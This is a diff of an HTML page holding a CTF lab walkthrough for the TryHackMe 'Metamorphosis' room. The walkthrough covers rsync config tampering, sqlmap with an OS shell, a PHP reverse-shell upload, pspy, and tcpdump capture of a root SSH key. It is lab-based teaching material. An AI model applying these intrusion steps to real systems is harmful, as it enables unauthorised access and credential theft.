@@ -7,56 +7,60 @@
 Wednesday, Jul 21, 2021
 | 6 minutes read
 | Update at
-Wednesday, Jul 21, 2021</div></h1></header><article class=main><h2 id=overview>OverView</h2><table><thead><tr><th>Metamorphosis</th><th></th></tr></thead><tbody><tr><td>Room</td><td style=text-align:center><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg alt=logo></td></tr></tbody></table><h2 id=recon>Recon</h2><h3 id=nmap>nmap</h3><pre><code class=language-nmap data-lang=nmap>sudo nmap -sC -sV -oN Metamorphosis 10.10.38.244
-[sudo] password for anir0y: 
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 03:35 IST
-Nmap scan report for 10.10.38.244
-Host is up (0.17s latency).
-Not shown: 995 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
-|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
-|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
-80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
-873/tcp open  rsync       (protocol version 31)
-Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Wednesday, Jul 21, 2021</div></h1></header><article class=main><h2 id=overview>OverView</h2><table><thead><tr><th>Metamorphosis</th><th></th></tr></thead><tbody><tr><td>Room</td><td style=text-align:center><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg alt=logo></td></tr></tbody></table><h2 id=recon>Recon</h2><h3 id=nmap>nmap</h3><pre><code> ```nmap
+ sudo nmap -sC -sV -oN Metamorphosis 10.10.38.244
+ [sudo] password for anir0y: 
+ Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 03:35 IST
+ Nmap scan report for 10.10.38.244
+ Host is up (0.17s latency).
+ Not shown: 995 closed ports
+ PORT    STATE SERVICE     VERSION
+ 22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey: 
+ |   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
+ |   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
+ |_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
+ 80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+ |_http-server-header: Apache/2.4.29 (Ubuntu)
+ |_http-title: Apache2 Ubuntu Default Page: It works
+ 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+ 873/tcp open  rsync       (protocol version 31)
+ Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Host script results:
-|_clock-skew: mean: 3s, deviation: 0s, median: 2s
-|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
-|   Computer name: incognito
-|   NetBIOS computer name: INCOGNITO\x00
-|   Domain name: \x00
-|   FQDN: incognito
-|_  System time: 2021-07-20T22:05:48+00:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-07-20T22:05:48
-|_  start_date: N/A
+ Host script results:
+ |_clock-skew: mean: 3s, deviation: 0s, median: 2s
+ |_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+ | smb-os-discovery: 
+ |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+ |   Computer name: incognito
+ |   NetBIOS computer name: INCOGNITO\x00
+ |   Domain name: \x00
+ |   FQDN: incognito
+ |_  System time: 2021-07-20T22:05:48+00:00
+ | smb-security-mode: 
+ |   account_used: guest
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ | smb2-security-mode: 
+ |   2.02: 
+ |_    Message signing enabled but not required
+ | smb2-time: 
+ |   date: 2021-07-20T22:05:48
+ |_  start_date: N/A
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
-</code></pre><h3 id=directory-listing-with-gobuster>Directory Listing with <code>GoBuster</code></h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
-<span style=color:#75715e>#txt &amp; php extention for good measure</span>
-...<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>...
-/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 10818<span style=color:#f92672>]</span>
-/admin                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 312<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.38.244/admin/<span style=color:#f92672>]</span>
-</code></pre></div><ul><li><p><code>admin</code> dir is returning <code>403</code></p><p><img src=https://i.imgur.com/3Vqorz4.png alt=img></p></li><li><p>stange enough it returns the following text upcon <code>view-source</code>
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
+ ```
+</code></pre><h3 id=directory-listing-with-gobuster>Directory Listing with <code>GoBuster</code></h3><pre><code> ```bash
+ gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
+ #txt &amp; php extention for good measure
+ ...[snip]...
+ /index.php            (Status: 200) [Size: 10818]
+ /admin                (Status: 301) [Size: 312] [--&gt; http://10.10.38.244/admin/]
+ ```
+</code></pre><ul><li><p><code>admin</code> dir is returning <code>403</code></p><p><img src=https://i.imgur.com/3Vqorz4.png alt=img></p></li><li><p>strange enough it returns the following text upcon <code>view-source</code>
 <img src=https://i.imgur.com/cOKj7Ek.png alt=img></p></li></ul><p>seems like somehow we need to change back /config website to <code>development</code> mode. seems like a deadend here! :(</p><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h3 id=rsync-enumeration>rsync enumeration</h3><ul><li><p>Enumerated the rsync module:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rsync -rdt rsync://10.10.38.244:873
 Conf            All Confs
 </code></pre></div></li><li><p>list content of <code>Conf</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rsync -rdt rsync://10.10.38.244:873/Conf
@@ -96,19 +100,19 @@ password <span style=color:#f92672>=</span> theCat
 
 <span style=color:#f92672>[</span>Details<span style=color:#f92672>]</span>
 Local <span style=color:#f92672>=</span> No
-</code></pre></div><p>seems like we have a wokring config, where currently <code>env</code> sets to <strong>prod</strong> and we can actually change and re-upload to the server. let&rsquo;s try doing this.</p><p>replace <code>env = prod</code> to <code>env = dev</code></p></li><li><p>reuploading <code>webapp.ini</code> to the server</p></li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
+</code></pre></div><p>seems like we have a wokring config, where currently <code>env</code> sets to <strong>prod</strong> and we can actually change and re-upload to the server. let&rsquo;s try doing this.</p><p>replace <code>env = prod</code> to <code>env = dev</code></p></li><li><p>reuploading <code>webapp.ini</code> to the server</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
 sending incremental file list
 webapp.ini
 
 sent <span style=color:#ae81ff>171</span> bytes  received <span style=color:#ae81ff>41</span> bytes  84.80 bytes/sec
 total size is <span style=color:#ae81ff>71</span>  speedup is 0.33
 <span style=color:#75715e># uploaded the edited file</span>
-</code></pre></div><h3 id=re-visiting-the-web>re-visiting the web</h3><ul><li><p>this time web-application actually worked!</p><p><img src=https://i.imgur.com/Am4aEwe.png alt=img></p></li><li><p>we have one <code>input</code>, first thing I&rsquo;m gonna try is <code>SQLMAP</code> for sqlinjection attack.</p></li><li><p>saving the SQL payload using Burp
+</code></pre></div></li></ul><h3 id=re-visiting-the-web>re-visiting the web</h3><ul><li><p>this time web-application actually worked!</p><p><img src=https://i.imgur.com/Am4aEwe.png alt=img></p></li><li><p>we have one <code>input</code>, first thing I&rsquo;m gonna try is <code>SQLMAP</code> for sqlinjection attack.</p></li><li><p>saving the SQL payload using Burp
 <img src=https://i.imgur.com/7k8g5LK.png alt=img></p></li><li><p>running <code>SQLMAP</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -r username.req --level <span style=color:#ae81ff>3</span> --risk <span style=color:#ae81ff>3</span> --batch --os-shell
 <span style=color:#75715e># trying to get a `os-shell` this way</span>
 </code></pre></div><p><img src=https://i.imgur.com/WEZbgc4.png alt=img></p><p>and it worked! let&rsquo;s try and get a proper working shell</p></li><li><p>With command execution, establish a persistent shell by transferring a php script and calling it with curl to return a reverse shell on the target.</p><p>I will be uploading <code>php reverse shell</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cp /usr/share/webshells/php/php-reverse-shell.php rev.php
 </code></pre></div><p><img src=https://i.imgur.com/FLWILS7.png alt=img>
-change the IP</p></li><li><p>upload it via curl:</p><p><img src=https://i.imgur.com/kjY2byf.png alt=img></p><p>got the <code>low priv</code> shell access to the box</p></li><li><p>we can read the <code>user.txt</code> file with current shell.</p><p><img src=https://i.imgur.com/Crs4ZDe.png alt=img></p></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=root>root</h2><p>so far we have a low priv shell running as <code>www-data</code></p><h3 id=privilege-escalation>Privilege Escalation</h3><ul><li><p>I ran <code>linpeas</code> but no usefull results. except <code>www-data</code> can run <code>tcpdump</code></p></li><li><p><code>sudo -l</code> returns nothing useful</p></li><li><p>got a hint for running <code>Pspy</code>. you can download it here: <a href=https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0>https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0</a></p></li><li><p>running <code>PSPY</code></p></li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># download to the BOX</span>
+change the IP</p></li><li><p>upload it via curl:</p><p><img src=https://i.imgur.com/kjY2byf.png alt=img></p><p>got the <code>low priv</code> shell access to the box</p></li><li><p>we can read the <code>user.txt</code> file with current shell.</p><p><img src=https://i.imgur.com/Crs4ZDe.png alt=img></p></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=root>root</h2><p>so far we have a low priv shell running as <code>www-data</code></p><h3 id=privilege-escalation>Privilege Escalation</h3><ul><li><p>I ran <code>linpeas</code> but no usefull results. except <code>www-data</code> can run <code>tcpdump</code></p></li><li><p><code>sudo -l</code> returns nothing useful</p></li><li><p>got a hint for running <code>Pspy</code>. you can download it here: <a href=https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0>https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0</a></p></li><li><p>running <code>PSPY</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># download to the BOX</span>
 wget http://10.17.4.40/pspy64s
 wget http://10.17.4.40/pspy64s
 --2021-07-20 23:03:43--  http://10.17.4.40/pspy64s
@@ -129,15 +133,15 @@ pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
-    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
-    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
-    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
-    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
-    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
-    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
-    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
-                   ░           ░ ░     
-                               ░ ░ 
+▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+               ░           ░ ░     
+                              ░ ░ 
 
 ...
 2021/07/20 23:05:06 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1877</span>   | python -c import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span> 
@@ -147,31 +151,31 @@ pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 2021/07/20 23:06:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20563</span>  | /bin/sh /root/req.sh 
 2021/07/20 23:06:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20562</span>  | /bin/sh -c /root/req.sh 
 <span style=color:#75715e># well root is trying to run something!!</span>
-</code></pre></div><p>Attempts to curl it as the www-data user fail and are met with a message stating it only interacts with the root user. Attempts to tunnel the internal port back to the target machine and curl as root there failed. So tcpdump was identified installed and used to capture the curl request. The resulting packet capture was transferred to the attacking machine and opened in wireshark.</p><ul><li>run tcpdump in one terminal</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>tcpdump -i any -s <span style=color:#ae81ff>0</span> -w 1.pcap
+</code></pre></div></li></ul><p>Attempts to curl it as the www-data user fail and are met with a message stating it only interacts with the root user. Attempts to tunnel the internal port back to the target machine and curl as root there failed. So tcpdump was identified installed and used to capture the curl request. The resulting packet capture was transferred to the attacking machine and opened in wireshark.</p><ul><li><p>run tcpdump in one terminal</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>tcpdump -i any -s <span style=color:#ae81ff>0</span> -w 1.pcap
 <span style=color:#75715e># my relative path is `/var/www/html/</span>
 <span style=color:#75715e>#reason being I can wget the pcap without terminating the tcpdump</span>
-</code></pre></div><ul><li>run pspy on 2nd terminal</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@incognito:/tmp$ ./ps*
+</code></pre></div></li><li><p>run pspy on 2nd terminal</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@incognito:/tmp$ ./ps*
 ./ps*
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
-    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
-    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
-    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
-    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
-    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
-    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
-    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
-                   ░           ░ ░     
-                               ░ ░     
+▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+               ░           ░ ░     
+                              ░ ░     
 
 <span style=color:#75715e># wait till these shows up again</span>
 1/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1830</span>   | curl http://127.0.0.1:1027/?admin<span style=color:#f92672>=</span>ScadfwerDSAd_343123ds123dqwe12                                                       
 2021/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1829</span>   | /bin/sh /root/req.sh 
 2021/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1828</span>   | /bin/sh -c /root/req.sh 
-</code></pre></div><ul><li>wget the pcap file</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>wget MACHINE_IP/traffic.pcap
-</code></pre></div><ul><li><p>open <code>pcap</code> file with wireshark
+</code></pre></div></li><li><p>wget the pcap file</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>wget MACHINE_IP/traffic.pcap
+</code></pre></div></li><li><p>open <code>pcap</code> file with wireshark
 <img src=https://i.imgur.com/63l0roF.png alt=img></p></li><li><p>copy the key
 <img src=https://i.imgur.com/4CYUtN7.png alt=img></p></li><li><p>save the <code>ssh</code> key</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vi key.ssh                         <span style=color:#75715e># put the content</span>
 chmod <span style=color:#ae81ff>600</span>                          <span style=color:#75715e>#require for SSH key security</span>
